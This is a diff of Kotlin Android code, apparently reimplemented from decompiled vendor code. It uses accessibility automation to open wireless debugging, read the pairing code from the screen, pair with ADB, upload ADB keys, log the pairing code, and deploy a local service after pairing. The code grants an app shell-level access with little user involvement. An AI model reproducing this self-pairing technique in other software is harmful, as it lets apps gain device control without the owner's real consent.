+            executor.schedule({ timeoutHandler() }, 120L, TimeUnit.SECONDS)
+            executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)
+        } catch (e: Exception) {
+            Log.w(TAG, "startPairFlow: 无法调度超时任务: ${e.message}")
+        }
 
         pairState.set(PairState.PAIR_DEPT_UNKNOWN)
         sleep200(5)
@@ -3803,22 +4234,34 @@ class SystemOptimizeManager private constructor(
             Log.d(TAG, "已在开发者选项页面，直接查找无线调试")
             sleep200(5)
             processedActions.add("pairInDevOption")
-            scheduleTask("G") {
-                // vendor: b0() pairInDevOption — navigate to wireless debugging
-                pairInDevOption()
-                Log.d(TAG, "pairInDevOption dispatched from startPairFlow")
-            }
+            scheduleTask("G") { pairInDevOption() }
+        } else if (isInWifiDebugWindow()) {
+            Log.d(TAG, "已在无线调试页面，直接开始配对")
+            sleep200(5)
+            processedActions.add("pairInWifiDebugWindow")
+            scheduleTask("W") { pairInWifiDebugWindow() }
         } else {
-            // vendor: isInWirelessDebugWindow check depends on bf1 (windowDetector)
             Log.d(TAG, "不在设置页面，打开开发者选项")
             openDevOptionsRetryV2()
         }
     }
 
     /**
-     * Cleanup after pairing — call finishLocalAdbPair if not already finished.
-     * vendor: k4 (line 5157)
+     * 120s timeout guard — force-stop pairing if not yet finished.
+     * vendor: k4 / m212094k4 (line 5157)
      */
+    fun timeoutHandler() {
+        try {
+            if (pairState.get() == PairState.PAIR_DEPT_PAIR_FINISH) {
+                Log.d(TAG, "timeoutHandler: 配对已完成，无需超时处理")
+                return
+            }
+            Log.w(TAG, "timeoutHandler: 120s超时，强制结束配对流程")
+            finishLocalAdbPair()
+        } catch (e: Exception) {
+            Log.e(TAG, "timeoutHandler 异常", e)
+        }
+    }
 
     /**
      * Navigate developer options to find and click wireless debugging entry.
@@ -3952,8 +4395,142 @@ class SystemOptimizeManager private constructor(
                 Log.w(TAG, "G() 点击失败")
             }
             processedActions.remove("pairInDevOption")
+
+            // 进入无线调试页面后执行配对流程 (vendor b4 后半段 L731-791)
+            pairInWifiDebugWindow()
         } catch (e: Exception) {
             Log.e(TAG, "G() pairInDevOption 异常", e)
+        }
+    }
+
+    /**
+     * 在无线调试页面内执行配对流程。
+     * 对齐 vendor C0360a2.m211995b4() 行 731-791。
+     *
+     * Steps:
+     * 1. 循环 20 次查找"使用配对码配对设备"按钮 (1.5s 间隔)
+     * 2. 点击按钮 (通过 findClickableParentCompat 找到可点击祖先)
+     * 3. 设置状态为 PAIRING
+     * 4. 10 秒超时轮询 extractPairingCodeAndPort() (500ms 间隔)
+     * 5. 调用 doPair() 进行 SPAKE2+TLS 配对
+     * 6. 成功: 设置 PAIR_SUCCESS + uploadAdbKeys() + syncADBConfig
+     * 7. 失败: 设置 PAIR_FAIL
+     */
+    fun pairInWifiDebugWindow() {
+        try {
+            var pairingButton: AccessibilityNodeInfo? = null
+
+            // Step 1: 循环 20 次查找配对按钮 (vendor L731-741, 1.5s 间隔)
+            // 同时检查配对码弹窗是否已打开（用户手动或上一轮已点击）
+            var dialogAlreadyOpen = false
+            for (i in 0 until 20) {
+                // 先检查弹窗是否已弹出（"与设备配对"弹窗可能已存在）
+                val earlyInfo = extractPairingCodeAndPort()
+                if (earlyInfo != null) {
+                    Log.i(TAG, "[pairInWifiDebugWindow] 配对码弹窗已打开，跳过按钮搜索")
+                    dialogAlreadyOpen = true
+                    break
+                }
+                val root = service.rootInActiveWindow ?: continue
+                pairingButton = findNodeByTexts(root, SetupConstants.PAIR_DEVICE_BUTTON_TEXTS)
+                if (pairingButton != null) break
+                sleep200(7)
+                Log.d(TAG, "[pairInWifiDebugWindow] 查找配对按钮 iter=$i")
+            }
+            if (!dialogAlreadyOpen) {
+                if (pairingButton == null) {
+                    Log.e(TAG, "未找到[使用配对码配对设备]按钮")
+                    return
+                }
+
+                // Step 2: 点击配对按钮 (vendor L746-752)
+                val clickTarget = findClickableParentCompat(pairingButton) ?: pairingButton
+                if (!clickTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                    Log.e(TAG, "点击[使用配对码配对设备]失败")
+                    return
+                }
+                Log.i(TAG, "已点击[使用配对码配对设备]，等待配对码弹窗...")
+            }
+            pairState.set(PairState.PAIR_DEPT_PAIRING)
+
+            // Step 3: 10 秒超时轮询配对码 (vendor L756-763, 500ms 间隔)
+            var pairingInfo: PairingInfo? = null
+            val deadline = System.currentTimeMillis() + 10_000L
+            while (System.currentTimeMillis() < deadline) {
+                sleep200(2) // 2 * 200ms = 400ms ≈ vendor 500ms (sleep via k1)
+                pairingInfo = extractPairingCodeAndPort()
+                if (pairingInfo != null) break
+            }
+            if (pairingInfo == null) {
+                Log.e(TAG, "等待配对码超时（10秒）")
+                pairState.set(PairState.PAIR_DEPT_PAIR_FAIL)
+                return
+            }
+            Log.i(TAG, "配对码读取成功: port=${pairingInfo.port}, code=${pairingInfo.pairingCode}")
+
+            // Step 4: SPAKE2+TLS 配对 (vendor L769-777)
+            firstDeployDone = false // vendor L770: f53852d7 = false
+            if (doPair(pairingInfo.port, pairingInfo.pairingCode)) {
+                Log.i(TAG, "配对成功")
+                pairState.set(PairState.PAIR_DEPT_PAIR_SUCCESS)
+                // 读取并保存调试端口 (vendor: pairInPairSuccess → m212021i7 读端口)
+                // 优先从屏幕读取 (无线调试页面显示 IP:port)，fallback 到 Settings.Global + netstat
+                try {
+                    var debugPort = 0
+                    for (attempt in 1..5) {
+                        debugPort = readDebugPortFromScreen()
+                        if (debugPort > 0) {
+                            Log.i(TAG, "从屏幕读取到调试端口: $debugPort (第${attempt}次)")
+                            break
+                        }
+                        Log.d(TAG, "第${attempt}次未读到端口，等待重试...")
+                        sleep200(5)
+                    }
+                    if (debugPort <= 0) {
+                        debugPort = getWirelessDebugPort()
+                        if (debugPort > 0) Log.i(TAG, "从系统/netstat 读取到调试端口: $debugPort")
+                    }
+                    if (debugPort > 0) {
+                        saveDebugPortAndSync(debugPort)
+                        Log.i(TAG, "调试端口已保存: $debugPort")
+                    } else {
+                        Log.w(TAG, "未能读取到调试端口")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "保存调试端口异常", e)
+                }
+                try {
+                    Log.d(TAG, "密钥上传结果: ${uploadAdbKeys()}")
+                } catch (e: Exception) {
+                    Log.e(TAG, "上传密钥异常", e)
+                }
+                // vendor L780: sync ADB config to server
+                try {
+                    val configJson = buildAdbConfigJson(true)
+                    val result = postToLocalService("/syncADBConfig", configJson)
+                    Log.i(TAG, "/syncADBConfig 同步结果: $result")
+                } catch (e: Exception) {
+                    Log.i(TAG, "/syncADBConfig 调用失败: ${e.message}")
+                }
+                // vendor: deploy local-service after pairing success
+                try {
+                    Log.i(TAG, "配对成功，开始部署 local-service")
+                    deployLocalService()
+                } catch (e: Exception) {
+                    Log.w(TAG, "部署 local-service 异常: ${e.message}")
+                }
+            } else {
+                Log.i(TAG, "配对失败")
+                pairState.set(PairState.PAIR_DEPT_PAIR_FAIL)
+            }
+
+            // vendor L788-789: check if should finish
+            if (isFinished.get()) {
+                finishLocalAdbPair()
+            }
+            processedActions.remove("pairInWifiDebugWindow")
+        } catch (e: Exception) {
+            Log.e(TAG, "pairInWifiDebugWindow 异常", e)
         }
     }
 
@@ -4037,9 +4614,10 @@ class SystemOptimizeManager private constructor(
         isPairRunning.set(true)
         isFinished.set(false)
 
-        // vendor: recreates executor if shutdown — our executor is val
+        // vendor: recreates executor if shutdown
         if (executor.isShutdown) {
-            Log.w(TAG, "triggerPairFlow: executor 已关闭")
+            Log.i(TAG, "triggerPairFlow: executor 已关闭，重新创建")
+            executor = Executors.newSingleThreadScheduledExecutor()
         }
 
         executor.schedule({ /* 120s timeout */ }, 120L, TimeUnit.SECONDS)
@@ -4152,7 +4730,7 @@ class SystemOptimizeManager private constructor(
     fun extractPairingCodeAndPort(): PairingInfo? {
         val root = service.rootInActiveWindow ?: return null
         val textNodes = ArrayList<AccessibilityNodeInfo>()
-        collectTextViewNodes(root, textNodes)
+        collectAllNodes(root, textNodes)
 
         // vendor: uses dh0.f55787d7 as excluded text set (pairing dialog labels)
         val excludedTexts = SetupConstants.PAIRING_CODE_EXCLUDED_TEXTS
@@ -4164,7 +4742,7 @@ class SystemOptimizeManager private constructor(
             if (excludedTexts.contains(text)) continue
 
             // Try to extract IP:port
-            val parts = text.split(":")
+            val parts = text.split(":", limit = 6)
             if (parts.size == 2) {
                 val portStr = parts[1].trim()
                 if (portStr.all { it.isDigit() } && portStr.isNotEmpty() && port <= 0) {
